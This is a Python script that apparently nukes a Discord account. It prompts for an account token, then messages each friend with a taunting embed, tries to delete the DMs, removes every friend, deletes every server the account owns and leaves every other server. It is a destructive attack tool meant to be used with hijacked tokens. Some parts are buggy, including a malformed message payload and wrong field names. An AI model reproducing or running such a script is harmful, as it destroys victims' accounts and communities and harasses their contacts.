import os
import requests
import time

from colorama import Fore, init
init(convert=True)

print(f"[{Fore.CYAN}Insert Token{Fore.RESET}]")
token = input(" > ")

headers = {
    "content-type": "application/json",
    "authorization": token,
    'access-control-allow-headers': 'Content-Type, Authorization'
}

embed = '{ "content": "<@!ID>", tts: true, "embed": { "description": "This account got fucked...... " } }'

with requests.Session() as session:

    friends = session.get('https://discordapp.com/api/v6/users/@me/relationships', headers=headers).json()

    guilds = session.get("https://discordapp.com/api/v6/users/@me/guilds", headers=headers).json()


    for friend in friends:
        session.post(f'https://discordapp.com/api/v6/channels/{friend["id"]}/messages', json=embed.replace("ID", friend['id']), headers=headers)
        print(f"Sent a message to: {friend['username']}")

        session.post(f'https://discordapp.com/api/v6/channels/{friend["id"]}', headers=headers)
        print(f"Deleted the dm of: {friend['name']}")

        session.delete(f"https://discordapp.com/api/v6/users/@me/relationships/{friend['id']}", headers=headers)
        print(f"Removed friend of: {friend['username']}")

    for guild in guilds:
        if guild['owner'] == True:
            session.post(f"https://discordapp.com/api/v6/guilds/{guild['id']}/delete", json={}, headers=headers)
        session.delete(f'https://discordapp.com/api/v6/users/@me/guilds/{guild["id"]}', headers=headers)
        print(f"Removed guild of: {guild['name']}")
        
